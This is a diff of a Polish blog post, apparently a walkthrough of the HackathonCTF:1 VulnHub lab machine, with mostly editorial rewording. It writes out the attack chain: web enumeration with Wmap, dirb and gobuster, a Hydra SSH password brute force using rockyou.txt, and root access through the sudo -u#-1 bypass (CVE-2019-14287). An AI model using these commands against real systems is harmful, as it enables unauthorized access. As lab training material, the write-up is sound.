@@ -11,11 +11,10 @@ header:
   overlay_image: /assets/images/pasek-hack.png
 ---
 # Wstęp
-HackathonCTF: 1 został stworzony, jak i dużo ciekawych prostych podatnych obrazów przez [somu sen](https://www.vulnhub.com/author/somu-sen,747/). W tej wirtualce Twoim zadaniem jest zdobycie roota (flag nie widziałem). Ten obraz jest naprawdę prosty i będziesz miał dużo frajdy, jeżeli sam to wszystko przejdziesz. Wszystko jest na Ubuntu 14.04, więc na swoim XPC-NG nawet nie musiałem modyfikować, żeby sieciówka dobrze się uruchomiła. Obraz ściągniesz [stąd](https://www.vulnhub.com/entry/hackathonctf-1,591/)
+HackathonCTF:1 został stworzony (jak i dużo innych ciekawych obrazów) przez [somu sen](https://www.vulnhub.com/author/somu-sen,747/). W tej wirtualce Twoim zadaniem jest zdobycie roota (flag nie widziałem). Ten obraz jest naprawdę prosty i będziesz miał dużo frajdy, jeżeli sam to wszystko przejdziesz. Wirtualka jest na Ubuntu 14.04, więc ja na swoim XPC-NG nawet nie musiałem nic grzebać, żeby sieciówka się dobrze uruchomiła. Obraz ściągniesz [stąd](https://www.vulnhub.com/entry/hackathonctf-1,591/)
 {: .text-justify}
-
 ## Moduły w Metasploicie
-Zaczniemy od Metasploita. Przy okazji pokażę jak się używa w nim modułów. Na tapetę weźmiemy do celów szkoleniowych moduł [Wmap](https://www.offensive-security.com/metasploit-unleashed/wmap-web-scanner/). Jest to skaner stron www. Niestety jest dość stary, ale to nie przeszkadza do pobieżnej analizy. Poniżej screen i komendy, które wydałem. 
+Zaczniemy od Metasploita. Przy okazji pokażę, jak się używa w nim modułów. Na tapetę, do celów do celów szkoleniowych weźmiemy moduł [Wmap](https://www.offensive-security.com/metasploit-unleashed/wmap-web-scanner/). Jest to skaner stron www. Niestety jest dość stary, ale to nie przeszkadza do pobieżnej analizy. Poniżej screen i komendy, które wydałem. 
 {: .text-justify}
 ```bash
 msf6 > load wmap
@@ -263,10 +262,10 @@ msf6 > wmap_vulns -l
 [*]     GET Res code: 404
 msf6 >
 ```
-Niestety nic ciekawego za bardzo nam ten moduł nie znalazł, poza zakodowanym ciągiem w base64 **c3NoLWJydXRlZm9yY2Utc3Vkb2l0Cg==**. Działamy więc ręcznie. Po przeskanowaniu Nmap-em widzimy następujące otwarte porty. 
+Niestety, poza zakodowanym ciągiem w base64 **c3NoLWJydXRlZm9yY2Utc3Vkb2l0Cg==**, nic ciekawego ten moduł nie znalazł. Działamy więc ręcznie. Po przeskanowaniu Nmap-em widzimy następujące otwarte porty. 
 {: .text-justify}
-Należy pamiętać o przełączniku **-p-**, ponieważ ssh jest na nietypowym porcie i szybkie skanowanie nam go nie znajdzie
-{: .notice--warning}
+Należy pamiętać o przełączniku **-p-**, ponieważ ssh jest na nietypowym porcie i szybkie skanowanie nam go nie znajdzie. Polecenie Nmap-a zostawiam czytelnikowi.
+{: .notice--danger}
 ```bash
 host          port  proto  name    state  info
 ----          ----  -----  ----    -----  ----
@@ -276,15 +275,13 @@ host          port  proto  name    state  info
 172.16.1.167  7223  tcp    ssh     open   OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 Ubuntu Linux; protocol 2.0
 ```
 ## Już bez Metasploita
-Tradycyjnie zacznijmy od http. Wchodzimy na stronę (u mnie 172.16.1.167 ) i wyświetla się komunikat, że nie ma strony. Jednak jeżeli się przyjrzycie, to fejk. Prawdziwa strona jest, tylko tak spreparowana, żeby wyglądało, że jej nie ma ;)
+Tradycyjnie zacznijmy od Http. Wchodzimy na stronę (u mnie 172.16.1.167) i widzimy się komunikat, że nie ma strony. Jednak jeżeli się przyjrzycie, to jest fejk. Strona istnieje, tylko tak spreparowana, żeby wyglądało, że jej nie ma ;)
 {: .text-justify}
-
-sprawdzmy szybko jakieś ukryte stronki
+Sprawdzmy szybko, czy są jakieś ukryte stronki
 ```bash
 dirb http://172.16.1.167/
 ```
 Z ciekawszych jest **http://172.16.1.167/robots.txt**
-poniżej zawartość, w sumie to samo nam znalazł moduł Wmap.
 ```
 user-agent: *
 Disallow: /ctf
@@ -310,7 +307,7 @@ Disallow: /sudo
 
 c3NoLWJydXRlZm9yY2Utc3Vkb2l0Cg==
 ```
-Dirb więcej nam nic nie znalazł, jednak w **robots.txt** jest pewna wskazówka dotycząca plików, katalogów ctf, ftc, sudo. Wchodząc na stronę nie ma takich katalogów. Poszerzmy skanowanie pod kątem plików z rozszerzniami txt, php,html,htm
+Dirb nic więcej nie znalazł, jednak w **robots.txt** jest pewna wskazówka dotycząca plików, katalogów (ctf, ftc, sudo). Jednak próba wejścia http://172.16.1.167/sudo kończy się fiaskiem. To samo jest z ctf i ftc. Poszerzmy skanowanie pod kątem plików z rozszerzeniami: txt,php,html,htm
 ```bash
 gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u http://172.16.1.167 -x php,txt,html,htm
 ```
@@ -320,7 +317,8 @@ http://172.16.1.167/sudo.html
 http://172.16.1.167/ftc.html
 ```
 W **sudo.html**  mamy *uname : test*
-w **ftc.html** jest
+
+W **ftc.html** jest taka ciekawa rzecz
 ```
 <!-- #117
 #115
@@ -339,7 +337,7 @@ w **ftc.html** jest
 #116
 -->
 ```
-Zamieńmy to na tekst dla nas przystępny
+Zamieńmy to na przysępny tekst
 ```bash
 #!/bin/bash
 
@@ -353,19 +351,21 @@ done
 
 echo $string -n | xxd -r -p
 ```
-Wychodzi **se rockyou.txt**. Zostało nam **robots.txt**. Tam jest zakodowany ciąg w base64
+Wychodzi **se rockyou.txt**. 
+
+Zostało nam **robots.txt**. Tam zaś jest zakodowany ciąg w base64
 **c3NoLWJydXRlZm9yY2Utc3Vkb2l0Cg==**
 Po zdekodowaniu otrzymujemy **ssh-bruteforce-sudoit**
 ```bash
 echo -n c3NoLWJydXRlZm9yY2Utc3Vkb2l0Cg== | base64 -d
 ```
 Podsumowując mamy:
-
+```
 uname : test
 se rockyou.txt
 ssh-bruteforce-sudoit
-{: .notice--info}
-Żeby się dostać na serwer ssh musimy użyć metody siłowej, używając słownika rockyou.txt. Do tego bardzo dobrze nadaje się Hydra. Przyznam, że na początku zmyliło mnie te początkowe **se**. Ustawiłem szukanie metodą siłową słowa zaczynające się od **se**, jednak nic to nie dało. W parametrach Hydry astawiłem więcej wątków niż jest standardowo, aby skanowanie przebiegało szybciej.
+```
+Żeby się dostać na serwer ssh musimy użyć metody siłowej, używając słownika rockyou.txt. Do tego bardzo dobrze nadaje się Hydra. Przyznam, że na początku zmyliło mnie te początkowe **se**. Ustawiłem szukanie metodą siłową słowa zaczynające się od **se**, jednak nic to nie dało. W parametrach Hydry ustawiłem więcej wątków niż jest standardowo, aby skanowanie przebiegało szybciej.
 {: .text-justify}
 ```bash
 hydra -t 64 -l test -P /usr/share/wordlists/rockyou.txt ssh://172.16.1.167:7223 -V -I -f
@@ -376,15 +376,15 @@ hydra -t 64 -l test -P /usr/share/wordlists/rockyou.txt ssh://172.16.1.167:7223 
 ssh test@172.16.1.167 -p 7223
 ```
 ## Mamy Shella
-mam taki nawyk, że wchodząc na serwer od razu przeglądam historię. Tym razem to się przydało. Mamy parę ciekawych rzeczy.
-
+Mam taki nawyk, że wchodząc na serwer od razu przeglądam historię. Tym razem to się przydało. Mamy parę ciekawych rzeczy.
+{: .text-justify}
 ```
 99  cat pass.txt
 100  nano pass.txt
 167  sudo -u#-1 /bin/bash
 ```
 Widzimy jakiś plik i komendę z Sudo
-
+{: .text-justify}
 ```bash
 test@ctf:~$ sudo -l
 [sudo] password for test:
@@ -400,10 +400,8 @@ test@ctf:~$
 ```bash
 sudo -u#-1 /bin/bash
 ```
-Jest root. Poszukałem trochę po necie i się dowiedziałem, że jest to podatność z CVE 2019-14287. Możesz o niej przeczytać [tutaj](https://www.exploit-db.com/exploits/47502)
-
-Przeglądając historię jeszcze widzimy plik **pass.txt**.
-Mając root-a szybko coś znajdziemy
+Jest root. Poszukałem trochę po necie i się dowiedziałem, że jest to podatność z CVE 2019-14287. Możesz o niej przeczytać [tutaj](https://www.exploit-db.com/exploits/47502). Przeglądając historię jeszcze widzimy plik **pass.txt**. Mając root-a szybko coś znajdziemy
+{: .text-justify}
 ```bash
 root@ctf:~# find / -name pass.txt
 /media/floppy0/media/imp/pass.txt
@@ -416,5 +414,6 @@ CTFdfrGHYjUsSsKK@12345
 test@ctf:~$
 ```
 Mamy hasło, ale nie wiadomo do czego. Potem się okazało, że się przydało do pliku /var/zip.rar. W pliku nic nie było.
-Bardzo ciekawy i dosyć łatwy obraz na podatność. W sam raz dla początkujących.
 {: .text-justify}
+Bardzo ciekawy i dosyć łatwy obraz do złamania. W sam raz dla początkujących.
+{: .notice--success}
